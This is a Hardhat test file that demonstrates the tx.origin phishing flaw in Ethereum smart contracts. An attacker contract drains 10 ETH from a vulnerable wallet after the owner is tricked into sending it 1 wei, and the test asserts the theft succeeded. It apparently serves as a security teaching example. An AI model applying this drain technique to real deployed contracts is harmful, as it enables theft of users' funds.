const { expect } = require("chai");
const { ethers } = require("hardhat");
const { BigNumber } = require("ethers");
const { parseEther } = require("ethers/lib/utils");

describe("tx.origin", function () {
  it("AttackWallet.sol will be able to drain the eth balance of VulerableWallet.sol", async function () {
    // Get two addresses, treat one as innocent user and one as attacker
    const [_, innocent, attacker] = await ethers.getSigners();

    //  Innocent user deposits 10 Eth into it's while Deploying the vulnerable wallet contract
    const VulerableWallet = await ethers.getContractFactory("VulnerableWallet");
    const vulnerableContract = await VulerableWallet.connect(innocent).deploy({
      value: parseEther("10"),
    });
    await vulnerableContract.deployed();

    // Check that at this point the vulnerableContract's balance is 10 ETH
    let balanceETH = await ethers.provider.getBalance(
      vulnerableContract.address
    );
    expect(balanceETH).to.equal(parseEther("10"));

    // Deploy the AttackWallet contract
    const AttackWallet = await ethers.getContractFactory("AttackWallet");
    const attackWallet = await AttackWallet.connect(attacker).deploy(
      vulnerableContract.address
    );
    await attackWallet.deployed();

    // Balance of Attacker before the attack
    let attackerPreviousBalance = await ethers.provider.getBalance(
      attacker.address
    );

    // Tricked Inncocent depositor into sending any amount (1 wei) to the AttackWallet Contract
    await innocent.sendTransaction({
      to: attackWallet.address,
      value: 1,
    });

    // Balance of the VulnerableContract wallet's balance is now zero
    balanceETH = await ethers.provider.getBalance(vulnerableContract.address);
    expect(balanceETH).to.equal(BigNumber.from("0"));

    // Balance of Attacker is now increased by 10 ETH stolen from Vulnerable Contract wallet
    let attackerAfterBalance = await ethers.provider.getBalance(
      attacker.address
    );
    expect(attackerAfterBalance).to.equal(
      attackerPreviousBalance.add(parseEther("10"))
    );
  });
});
